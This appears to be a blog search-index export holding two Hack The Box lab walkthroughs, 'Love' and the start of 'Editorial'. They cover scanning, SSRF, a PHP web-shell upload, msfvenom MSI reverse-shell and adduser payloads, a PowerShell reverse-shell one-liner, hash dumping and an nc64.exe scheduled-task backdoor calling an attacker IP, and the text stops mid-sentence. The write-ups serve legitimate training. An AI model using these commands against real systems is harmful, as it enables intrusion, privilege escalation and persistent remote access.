SF:4A,\u0026#34;F\\0\\0\\x01\\xffj\\x04Host\\x20\u0026#39;10\\.10\\.14\\.80\u0026#39;\\x20is\\x20not\\x20allowed\\ SF:x20to\\x20connect\\x20to\\x20this\\x20MariaDB\\x20server\u0026#34;)%r(NotesRPC,4A,\u0026#34;F\\ SF:0\\0\\x01\\xffj\\x04Host\\x20\u0026#39;10\\.10\\.14\\.80\u0026#39;\\x20is\\x20not\\x20allowed\\x20to\\ SF:x20connect\\x20to\\x20this\\x20MariaDB\\x20server\u0026#34;)%r(JavaRMI,4A,\u0026#34;F\\0\\0\\x01 SF:\\xffj\\x04Host\\x20\u0026#39;10\\.10\\.14\\.80\u0026#39;\\x20is\\x20not\\x20allowed\\x20to\\x20conn SF:ect\\x20to\\x20this\\x20MariaDB\\x20server\u0026#34;)%r(ms-sql-s,4A,\u0026#34;F\\0\\0\\x01\\xffj\\ SF:x04Host\\x20\u0026#39;10\\.10\\.14\\.80\u0026#39;\\x20is\\x20not\\x20allowed\\x20to\\x20connect\\x2 SF:0to\\x20this\\x20MariaDB\\x20server\u0026#34;); No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.94SVN%E=4%D=12/23%OT=80%CT=1%CU=32188%PV=Y%DS=2%DC=I%G=Y%TM=676 OS:8FEFA%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10B%TI=I%CI=I%II=I%SS=S OS:%TS=U)OPS(O1=M53CNW8NNS%O2=M53CNW8NNS%O3=M53CNW8%O4=M53CNW8NNS%O5=M53CNW OS:8NNS%O6=M53CNNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN( OS:R=Y%DF=Y%T=80%W=FFFF%O=M53CNW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R= OS:Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F= OS:R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%R OS:UCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z) Network Distance: 2 hops Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required | smb2-time: | date: 2024-12-23T07:32:18 |_ start_date: N/A | smb-os-discovery: | OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3) | OS CPE: cpe:/o:microsoft:windows_10::- | Computer name: Love | NetBIOS computer name: LOVE\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2024-12-22T23:32:20-08:00 |_clock-skew: mean: 3h21m34s, deviation: 4h00m02s, median: 1h21m33s | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 252.50 seconds Findings: Looking at the certificate there is a DNS entry for staging.love.htb \u0026amp; the organization name ValentineCorp. | ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in I can see that the computer name is love | Computer name: Love Further services are running: HTTP: 5040 pando-pub 7680 RPC: 47001 49664 49665 49666 49667 49668 49669 49670 Updating ETC/HOSTS \u0026amp; Variables: Updated Domain \u0026amp; Machine Variables for Testing:\nNow that I have this information, I can update the domain and machine variables used in tests: update_var domain \u0026quot;love.htb\u0026quot; update_var machine \u0026quot;love\u0026quot; Updating /etc/hosts for DNS and LDAP Queries:\nI update my /etc/hosts file. echo \u0026quot;$box $domain staging.$domain\u0026quot; | sudo tee -a /etc/hosts SMB 445: Attempting to connect with NULL \u0026amp; Guest sessions: This is a standard check I always try as alot of the time the guest account or null sessions can lead to a foothold: netexec smb $box -u 'guest' -p '' --shares netexec smb $box -u '' -p '' --shares Service 5000: I try and access the service on this port via telnet and the browser but it\u0026rsquo;s forbidden. telnet $box 5000 curl http://$box:5000 -v -L Forbidden. Service 7680: I get no response from this service via telnet or curl. telnet $box 7680 curl http://$box:7680 -v -L Web 80/443: Web Enumeration via Burp Suite: When enumerating a website, always use Burp Suite. This allows you to: Record all potential injection points. Capture relevant responses for each request, making it easier to analyze vulnerabilities and track your testing progress. Whatweb: Lets run \u0026ldquo;whatweb\u0026rdquo; to see if I can glean some further information: whatweb $box | sed 's/, /\\n/g' kali in HTB/BlogEntriesMade/Love/scans/nmap 🍣 main 2GiB/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 06:37:10 zsh ❯ whatweb $box | sed \u0026#39;s/, /\\n/g\u0026#39; http://10.129.48.103 [200 OK] Apache[2.4.46] Bootstrap Cookies[PHPSESSID] Country[RESERVED][ZZ] HTML5 HTTPServer[Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27] IP[10.129.48.103] JQuery OpenSSL[1.1.1j] PHP[7.3.27] PasswordField[password] Script Title[Voting System using PHP] X-Powered-By[PHP/7.3.27] X-UA-Compatible[IE=edge] +Note+: I use sed to put the output across multiple lines for easier reading. Dirbusting the webserver using ferox: I Perform some directory busting to see if there are any interesting directories: feroxbuster -u http://$domain/ --threads 20 --scan-limit 2 -q -r -o $domainFeroxScan.txt There are alot of hits as well as an admin panel. There are these files in ADMIN however they do not yield anything of note when I access them. love.htb: Visiting the web page: It\u0026rsquo;s always good to just manually click around and manually enumerate the pages available. I visit the web page http://love.htb/index.php and it\u0026rsquo;s a login page for a voting system. I try and login with test credentials and capture the post request. Bruteforcing Login with FFUF: Lets try some bruteforcing, for fun. I get the POST request from burp I modify it to the below so it\u0026rsquo;s compatible with ffuf. ffuf -w ~/Wordlists/rockyou.txt -u $\u0026#39;http://love.htb/login.php\u0026#39; -X POST -H $\u0026#39;Host: love.htb\u0026#39; -H $\u0026#39;Content-Length: 31\u0026#39; -H $\u0026#39;Cache-Control: max-age=0\u0026#39; -H $\u0026#39;Accept-Language: en-US,en;q=0.9\u0026#39; -H $\u0026#39;Origin: http://love.htb\u0026#39; -H $\u0026#39;Content-Type: application/x-www-form-urlencoded\u0026#39; -H $\u0026#39;Upgrade-Insecure-Requests: 1\u0026#39; -H $\u0026#39;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36\u0026#39; -H $\u0026#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\u0026#39; -H $\u0026#39;Referer: http://love.htb/\u0026#39; -H $\u0026#39;Accept-Encoding: gzip, deflate, br\u0026#39; -H $\u0026#39;Connection: keep-alive\u0026#39; -b $\u0026#39;PHPSESSID=au4g1f3co0aocdo2efhui2r734\u0026#39; -d $\u0026#39;voter=admin\u0026amp;password=FUZZ\u0026amp;login=\u0026#39; -ic -fw 1 -fs 341 I let it run but get no hits. Reading the source code: I check the source code of the page as sometimes I can find useful information such as dev comments etc.\nI can see that the service is using software called ADMINLTE\nAfter some quick searching I find there is a vuln for LFI however it does not appear to vulnerable.\nhttps://security.snyk.io/vuln/SNYK-JS-ADMINLTE-3314993 staging.love.htb: Visiting the web page: Looking at the page it\u0026rsquo;s a file scanner. There is a DEMO where I can enter URL to have it scan. Discovering the DEMO page is vulnerable to SSRF: I stand a python webserver and enter the information into the scanner on the site.\nI can see I get a valid connection. I enter local host address http://127.0.0.1:80 and it shows the login box for the service running on the root web address love.htb. This signifies a SSRF vulnerability\nRetrieving Clear Text Credentials from the service running on port 5000: As I now know there is an SSRF vulnerability. I access the services I know are running but cannot access 7680 \u0026amp; 5000 so far.\nService 7680:\nI get no hits. Service 5000:\nI get a hit \u0026amp; retrieve clear text creds from a password service that is only accessible via localhost. Creds: admin:@LoveIsInTheAir!!!! Conducting An Internal Port Scan VIA The SSRF Vulnerability: To ensure that I do not miss anything I also conduct an internal port scan for all ports in-case there is anything else running internally.\nI create a port list to use:\nseq 1 65535 \u0026gt; Ports.txt I copy the POST request from Burp. I modify the curl command so it can be used with ffuf: adding the wordlist -w specifying the url -u adding the injection point: http://127.0.0.1:FUZZ Removing the newlines and making 1 line Proxying all traffic via burp -x http://127.0.0.1:8080 Remove size of 61 -fs 61 This can only be done once I have the initial response so I can then filter for the standard response. ffuf -w ~/Wordlists/45.06-CustomWordlists/Ports.txt -u $\u0026#39;http://staging.love.htb/beta.php\u0026#39; -X $\u0026#39;POST\u0026#39; -H $\u0026#39;Host: staging.love.htb\u0026#39; -H $\u0026#39;Content-Length: 47\u0026#39; -H $\u0026#39;Cache-Control: max-age=0\u0026#39; -H $\u0026#39;Accept-Language: en-US,en;q=0.9\u0026#39; -H $\u0026#39;Origin: http://staging.love.htb\u0026#39; -H $\u0026#39;Content-Type: application/x-www-form-urlencoded\u0026#39; -H $\u0026#39;Upgrade-Insecure-Requests: 1\u0026#39; -H $\u0026#39;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36\u0026#39; -H $\u0026#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\u0026#39; -H $\u0026#39;Referer: http://staging.love.htb/beta.php\u0026#39; -H $\u0026#39;Accept-Encoding: gzip, deflate, br\u0026#39; -H $\u0026#39;Connection: keep-alive\u0026#39; -d $\u0026#39;file=http%3A%2F%2F127.0.0.1%3AFUZZ\u0026amp;read=Scan+file\u0026#39; -x http://127.0.0.1:8080 -fs 61 I have added the image of the command below as I know sometimes the formatting of my site can lead to the code boxes running off of the page. (will fix, soz bbz)\nFindings: I just get a list of all the ports I have already found and nothing additional of note.\nAccessing the admin panel: I use the creds on the admin panel to login\nLooking at the admin panel I can see it\u0026rsquo;s called \u0026ldquo;Voting System\u0026rdquo; I do some googling and find the source code here - https://code-projects.org/voting-system-in-php-with-source-code/ 2. Foothold: Getting RCE on the host \u0026amp; a reverse shell: I do some searching and find an SQL vulnerability that enables the ability to dump the voters database, however if I look at the voters panel on the admin portal there are no registered users. So we could dump it and get an empty db.\nLooking further I find this exploit enabling RCE via an authenticated file upload attack.\nhttps://www.exploit-db.com/exploits/49445 Looking at the exploit it\u0026rsquo;s apparent that this is just a PHP reverse shell being uploaded as a profile photo for a user. The script connects, creates a new user and uploads the photo as a reverse shell, it then requests the reverse shell \u0026amp; triggers it. To verify this works I create a simple php shell \u0026amp; save it as shell.php\n\u0026lt;?php system($_GET[\u0026#39;cmd\u0026#39;]); ?\u0026gt; I upload it.\nI open the image in a new tab.\nI enter a simple command and it executes proving it\u0026rsquo;s vulnerable and that I have RCE.\nhttp://love.htb/images/shell.php?cmd=dir Now I could get a reverse-shell but this a chance for me to play with tools I don\u0026rsquo;t really use often, so I am going to use the wwwolf-php-webshell . It\u0026rsquo;s an amazing interactive web-shell.\nI download the main webshell.php file and repeat the same process as before, uploading as a profile pic for a new user and then accessing that profile pic.\nWhen I view the image I have this nice interactive webshell\nLet\u0026rsquo;s grab our user flag:\nI upload nc64.exe.\nMy webshell fun was short-lived, I want to run tools easily on the host OS. I connect back to my attack machine \u0026amp; get a reverse shell.\nEnumerating the host as phoebe: I can see I am logged in as a user called phoebe I run the following command to enumerate information about her and other logged in users.\nwhoami /priv /groups; query user; net user Shows: User privs User Group membership Other logged in users All users on the machine: (done last as list may be extensive) Nothing of note here. I upload Winpeas and execute it.\nIt extracts phoebes NTLMv2 hash. I run it through hashcat against rock you but it won\u0026rsquo;t crack. +Note+: As this is an easier box, I am not making a custom wordlist with CeWL as I don\u0026rsquo;t see that being a viable option given the difficulty of the box. Always install elevated available: Which can be a viable privesc path.\nIt is possible to check this setting manually too by querying the registry directly\nEnumerate if the Key exists (\u0026amp; therefore policy enabled) using Powershell:\n#Query machine policy (system wide): reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated #Query user policy (is the key set for the user I are logged in with ) reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated As I can see it\u0026rsquo;s set globally as a machine policy, this is bad! As it means that any user can install anything with admin privileges. We can use this to elevate to System. Primer: Key Differences in reg queries: Registry Hive Scope:\nHKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated:\nRefers to HKEY_LOCAL_MACHINE (HKLM), which applies settings at the system-wide level. Changes here affect all users on the machine. HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated:\nRefers to HKEY_CURRENT_USER (HKCU), which applies settings at the user-specific level. Only affects the currently logged-in user. Purpose\nHKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer:\nspecifically queries the AlwaysInstallElevated value in the HKEY_LOCAL_MACHINE hive. Represents a system-wide policy that determines if MSI files can be installed with elevated privileges (Administrator rights). Enabled (1): Allows all users to install MSI files with elevated privileges. Disabled (0 or absent): Prevents this behavior globally. HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated:\nSpecifically queries the AlwaysInstallElevated value. Determines whether the user can install software with elevated privileges (Administrator rights). Enabled (1): Allows installing MSI files with elevated privileges. Disabled (0 or absent): Prevents this behavior. 3. Privilege Escalation: Privesc Method 1: Creating a malicious msi reverse shell with msfvenom: I use msfvenom to create a malicious evil.msi file that is a reverse shell\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.80 LPORT=8888 -a x64 --platform Windows -f msi -o evil.msi I standup my python webserver.\npython3 -m http.server 9000 Copy the malicious msi to the host:\nStandup my nc listener:\nrlwrap -cAr nc -nvlp 8888 Run the .msi file and catch my NT/Authority\\system shell.\nGet the root flag:\nPrivesc Method 2: Adding a new Admin User with msfvenom: +Note+: This method is a bit more long winded and uses the same exploitation method of \u0026ldquo;always install elevated\u0026rdquo; but is a different route.\nI use msfvenom to create our malicious msi to add a new user.\nmsfvenom -p windows/adduser USER=bloodstiller PASS=BL00dstiLL3r# --platform Windows -f msi -o addAdminUser.msi I standup my python webserver.\npython3 -m http.server 9000 Copy the malicious msi to the host:\nVerify there are only the legitimate users on the host:\nRun the malicious addAdminUser.msi:\nVerify the user has been added:\nNow I cannot to use /runas as the shell is limited so I cannot pass credentials directly. Instead to run commands as the new user I will need to use a PowerShell Credentialed Object.\nA PowerShell credential object is an instance of the System.Management.Automation.PSCredential class that securely stores a username and password, created using Get-Credential (gui-prompt) or manually with the below (which I will use.) #1. Use secure sring to pass our password and store in the $pass var: $pass = convertto-securestring \u0026#39;BL00dstiLL3r#\u0026#39; -asplain -force #2. Pass our username: $username = \u0026#34;bloodstiller\u0026#34; #3. Pass username \u0026amp; password into one var $cred: $cred = New-Object System.Management.Automation.PSCredential ($username, $pass) #4. Run our Command passing it the \u0026#34;Credential $credential\u0026#34; arg + var: #Command: [command] -Credential $cred You might be tempted to try the below to simply read the file, however it won\u0026rsquo;t work.\ncat C:\\Users\\Administrator\\Desktop\\root.txt -Credential $cred The error occurs because the FileSystem provider in PowerShell does not support passing credentials directly when accessing files using commands like cat (alias for Get-Content). Instead I need to modify the command: Commands like Get-Content or cat directly interact with the file system in the current user’s context. The FileSystem provider does not support credentials for local file access. Simply specifying -Credential without creating a new session (or drive mapping) has no effect for these commands because local file access relies on the caller’s current security context. I can however read it another way by running a subscript as that user:\nInvoke-Command -ComputerName localhost -Credential $cred -ScriptBlock { Get-Content -Path \u0026#34;C:\\Users\\Administrator\\Desktop\\root.txt\u0026#34;} Why this works: Invoke-Command: Spawns a session under the specified credentials. (the ones I provide) The command inside the -ScriptBlock executes in that session. Subcommand (e.g., Get-Content): Runs as if it were invoked directly by the impersonated user, bloodstiller. Can access files and resources that the current user cannot. In action:\nI can see I am the user Phoebe I run the command to read the file in the context of my admin user bloodstiller which is successful and returns the flag (as this user is part of the admin group.) I try and read it in the context of Phoebe which is denied due not sufficient permissions. +Note+: The blurred parts are just empty lines I included to make the output easier to read.\nI can then start a reverse shell in the context of the user bloodstiller.\nStart-Process powershell -Credential $cred -ArgumentList \u0026#39;-NoP -NonI -W Hidden -Exec Bypass -Command \u0026#34;\u0026amp; { $client = New-Object System.Net.Sockets.TCPClient(\\\u0026#34;10.10.14.80\\\u0026#34;,6666); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535 | % {0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) { $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i); $sendback = (iex $data 2\u0026gt;\u0026amp;1 | Out-String); $sendback2 = $sendback + \\\u0026#34;PS \\\u0026#34; + (pwd).Path + \\\u0026#34;\u0026gt; \\\u0026#34;; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush(); }; $client.Close(); }\u0026#34;\u0026#39; I can see that the user is Phoebe, but I get our shell in the context of the user bloodstiller who is in the administrators group as I passed it our credentials via the credentialed object. 4. Persistence: Dumping Admin Hash with LaZagne.exe: I upload LaZagne.exe with a python webserver. I run it and dump the hashes on the system. I did try psexec however I could not find any valid shares running so this did not work. I have the hashes but cannot pass them, lets look at other options. Adding a Scheduled Task To Call Back Out to us: This is one of my favorite techniques as I can just set the task and whenever I want start our listener.\nschtasks /create /tn BkD00r /tr \u0026quot;C:\\xampp\\htdocs\\omrs\\images\\nc64.exe 10.10.14.80 4433 -e cmd\u0026quot; /sc minute /mo 1 /ru system\nCommand Breakdown: /sc minute: Specifies that the task should run every minute. /mo 1: Runs the task every 1 minute. /ru system: Runs the task with System privileges. /tr: Specifies the action to execute, in this case, running nc64.exe with the specified options. +Note+: This techniques runs every 1 minute and calls out to my attack machine. This means that even if I disconnect I can turn on my listener again and it will call back out to em. Shell Caught:\nAs I can see I caught the shell disconnected, started my listener again and was re-connected again. I now have two forms of persistence a user with admin privileges, albeit I need to follow the standard chain of web/reverse shell to then run commands in their context using a credentialed object or start our listener and get a system shell. Lessons Learned: What did I learn? I learned to just be persistent, again this is an easier box, but I was trying to rush it. Slow down and get it done properly. What silly mistakes did I make? I tried to cred stuff the voting page and not the admin page initially, really need to stop seeing two fields for user input and trying to ram creds in there. So I learned to slow down and read. Sign off: Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!\nUntil next time, hack the planet!\n– Bloodstiller\n– Get in touch bloodstiller at bloodstiller dot com\n", 
        "url": "http:\/\/localhost:1313\/walkthroughs\/love-box\/"
    },
    
    "http:\/\/localhost:1313\/tags\/msi\/": {
        "title": "Msi",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/msi\/"
    },
    
    "http:\/\/localhost:1313\/tags\/scheduledtask\/": {
        "title": "ScheduledTask",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/scheduledtask\/"
    },
    
    "http:\/\/localhost:1313\/tags\/api\/": {
        "title": "API",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/api\/"
    },
    
    "http:\/\/localhost:1313\/tags\/cve-2022-24439\/": {
        "title": "CVE-2022-24439",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/cve-2022-24439\/"
    },
    
    "http:\/\/localhost:1313\/walkthroughs\/editorial-box\/": {
        "title": "Editorial HTB Walkthrough",
        "tags": ["Box","HTB","Easy","Linux","Web","API","git","CVE-2022-24439","SSRF",],
        "content": "Editorial Hack The Box Walkthrough/Writeup: https://app.hackthebox.com/machines/Editorial How I use variables \u0026amp; Wordlists: Variables:\nIn my commands you are going to see me use $box, $user, $hash, $domain, $pass often. I find the easiest way to eliminate type-os \u0026amp; to streamline my process it is easier to store important information in variables \u0026amp; aliases. $box = The IP of the box $pass = Passwords I have access to. $user = current user I am enumerating with. Depending on where I am in the process this can change if I move laterally. $domain = the domain name e.g. sugarape.local or contoso.local $machine = the machine name e.g. DC01 Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information. Wordlists:\nI have symlinks all setup so I can get to my passwords from ~/Wordlists so if you see me using that path that\u0026rsquo;s why. If you are on Kali and following on, you will need to go to /usr/share/wordlists I also use these additional wordlists: Statistically-likely-usernames SecLists Auto_Wordlists 1. Enumeration: NMAP: Basic Scans: Basic TCP Scan: nmap $box -oA TCPbasicScan kali in HTB/BlogEntriesMade/Editorial/scans/nmap 🍣 main 🛤️ ×1 1GiB/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 11:52:10 zsh ❯ nmap $box -oA TCPbasicScan Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-21 11:52 GMT Nmap scan report for 10.129.206.26 Host is up (0.043s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 0.95 seconds Initial thoughts: SSH \u0026amp; Web. Comprehensive Scans: In depth scan TCP:\nsudo nmap -p- -sV -sC -O --disable-arp-ping $box -oA FullTCP kali in HTB/BlogEntriesMade/Editorial/scans/nmap 🍣 main 🛤️ ×1 1GiB/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 11:52:18 zsh ❯ sudo nmap -p- -sV -sC -O --disable-arp-ping $box -oA FullTCP Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-21 11:52 GMT Nmap scan report for 10.129.206.26 Host is up (0.039s latency). Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA) |_ 256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://editorial.htb No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.94SVN%E=4%D=12/21%OT=22%CT=1%CU=33625%PV=Y%DS=2%DC=I%G=Y%TM=676 OS:6AC33%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A OS:)OPS(O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53 OS:CST11NW7%O6=M53CST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88 OS:)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+ OS:%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=) OS:T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A OS:=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPC OS:K=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 35.24 seconds Findings: We can see the domain is editorial.htb. I add this to /etc/hosts Updated Domain \u0026amp; Machine Variables for Testing:\nNow that I have this information, I can update the domain and machine variables used in tests: update_var domain \u0026quot;editorial.htb\u0026quot; update_var machine \u0026quot;editorial\u0026quot; Updating /etc/hosts for DNS\nI update my /etc/hosts file: echo \u0026quot;$box $domain $machine.$domain\u0026quot; | sudo tee -a /etc/hosts Web 80: Web Enumeration via Burp Suite: When enumerating a website, always use Burp Suite. This allows you to: Record all potential injection points. Capture relevant responses for each request, making it easier to analyze vulnerabilities and track your testing progress. Whatweb: Lets run \u0026ldquo;whatweb\u0026rdquo; to see if we can glean some further information: whatweb $box\nkali in HTB/BlogEntriesMade/Editorial/scans/nmap 🍣 main 🛤️ ×1 1GiB/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 11:55:43 zsh ❯ whatweb $box http://10.129.206.26 [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.206.26], RedirectLocation[http://editorial.htb], Title[301 Moved Permanently], nginx[1.18.0] http://editorial.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.206.26], Title[Editorial Tiempo Arriba], X-UA-Compatible[IE=edge], nginx[1.18.0] Nothing especially interesting, we can see the site is using HTML5, nginx 1.18.0 and bootstrap. Dirbusting the webserver using ffuf: I Perform some directory busting to see if there are any interesting directories: ffuf -w ~/Wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt -u http://$domain/FUZZ -fc 403 -ic But there was only upload \u0026amp; about Visiting the web page: It\u0026rsquo;s always good to just manually click around and manually enumerate the pages available.\nIt appears to be a publishing website. Looking at the /about page we can see there is an email present submissions@tiempoarriba.htb\nLet\u0026rsquo;s keep track of this as it may come in use later. Enumerating the \u0026ldquo;Publish With Us\u0026rdquo; page for injection points: We can see that the \u0026ldquo;Publish With Us\u0026rdquo; allows us to uplaod a file as well as enter a url for the Cover. Lets test these injection points.\nI fill it with the following details to see the response:\nI setup a simple python webserver on my host and enter this address as the URL cover url to see if I can have the site actively call out to this address.\nI add a simple .php webshell\nI hit the \u0026ldquo;Preview\u0026rdquo; button.\nAs we can see it does in fact call out and connect to our server. Looking at the response for the request in burp we can see we are provided a url for a static/uploads folder and then a GUID of the uploaded file. We can also see that there is no file restrictions on the uploaded file. So we can pass our shell.php file. I navigate to the url but cannot access it: I pass the url with the GUID as the cover url \u0026amp; supply a command \u0026ldquo;whoami\u0026rdquo; to see if we can access it via SSRF and have our commands trigger but it does not work.\nFor the remaining fields I prefix with \u0026ldquo;test\u0026rdquo; and then the description of the field. (I do this as I want see how they are processed and possible rendered once I hit \u0026ldquo;Send Book Info\u0026rdquo;) Fuzzing for SSRF with ffuf: As we know the server will try and connect to an endpoint we can fuzz on localhost (127.0.01) for SSRF, by performing a port scan on the host. This will tell us if we can access any locally running services on the host and at the same time if SSRF is a viable path.\nI use the copy as curl command option in burp to copy my POST request:\n+Note+: I verified I could still enter a url without uploading a file and it reach out to my python server and it worked as expected. I create a port list to use:\nseq 1 65535 \u0026gt; Ports.txt I modify the curl command so it can be used with ffuf: adding the wordlist -w specifying the url -u adding the injection point: http://127.0.0.1:FUZZ Removing the newlines and making 1 line Proxying all traffic via burp -x http://127.0.0.1:8080 Remove size of 61 -fs 61 This can only be done once we have the initial response so we can then filter for the standard response. ffuf -w ~/Wordlists/45.06-CustomWordlists/Ports.txt -u \u0026#39;http://editorial.htb/upload-cover\u0026#39; -X $\u0026#39;POST\u0026#39; -H $\u0026#39;Host: editorial.htb\u0026#39; -H $\u0026#39;Content-Length: 315\u0026#39; -H $\u0026#39;Accept-Language: en-US,en;q=0.9\u0026#39; -H $\u0026#39;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36\u0026#39; -H $\u0026#39;Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAKLIgaiMMQNJmTJ6\u0026#39; -H $\u0026#39;Accept: */*\u0026#39; -H $\u0026#39;Origin: http://editorial.htb\u0026#39; -H $\u0026#39;Referer: http://editorial.htb/upload\u0026#39; -H $\u0026#39;Accept-Encoding: gzip, deflate, br\u0026#39; -H $\u0026#39;Connection: keep-alive\u0026#39; -d $\u0026#39;------WebKitFormBoundaryAKLIgaiMMQNJmTJ6\\x0d\\x0aContent-Disposition: form-data; name=\\\u0026#34;bookurl\\\u0026#34;\\x0d\\x0a\\x0d\\x0ahttp://127.0.0.1:FUZZ\\x0d\\x0a------WebKitFormBoundaryAKLIgaiMMQNJmTJ6\\x0d\\x0aContent-Disposition: form-data; name=\\\u0026#34;bookfile\\\u0026#34;; filename=\\\u0026#34;\\\u0026#34;\\x0d\\x0aContent-Type: application/octet-stream\\x0d\\x0a\\x0d\\x0a\\x0d\\x0a------WebKitFormBoundaryAKLIgaiMMQNJmTJ6--\\x0d\\x0a\u0026#39; -x http://127.0.0.1:8080 -fs 61 I have added the image of the command below as I know sometimes the formatting of my site can lead to the code boxes running off of the page. (will fix, soz bbz)\nWe get a hit on port 5000:\nAbusing SSRF To Access Internal API Endpoints: I enter this IP into the url box and we can see we are given the static/upload/GUID response again:\nI enter the url into my browser and the file downloads. When I look at the file it looks to be API information in json format:\nLooking at the contents we can see it\u0026rsquo;s information on an API running on the 5000 endpoint:\nI load these endpoints into burp intruder and query each endpoint\n+Note+: I tried this but for some reason when I attempted to download the returned files it would always fail. Instead I manually queried the endpoint, quickly extracted the string and downloaded the file. There may be a time limit on the files uploaded potentially. Retrieving default credentials from the \u0026ldquo;authors\u0026rdquo; API endpoint: The endpoint 